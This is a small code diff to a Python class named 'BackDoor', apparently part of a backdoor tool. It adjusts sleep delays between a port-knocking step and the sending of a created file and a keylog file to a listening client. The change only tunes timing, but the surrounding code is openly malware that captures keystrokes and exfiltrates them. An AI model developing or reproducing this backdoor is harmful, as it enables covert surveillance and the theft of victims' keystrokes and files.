@@ -234,9 +234,10 @@ class BackDoor:
         print("Knocking")
         self.port_knock()
         # Give time for client to open ports
-        time.sleep(2)
+        time.sleep(0.5)
         # Send created file
         self.prepare_data(self.path)
+        time.sleep(1)
         # Send keylog file
         self.prepare_data(self.log)
 
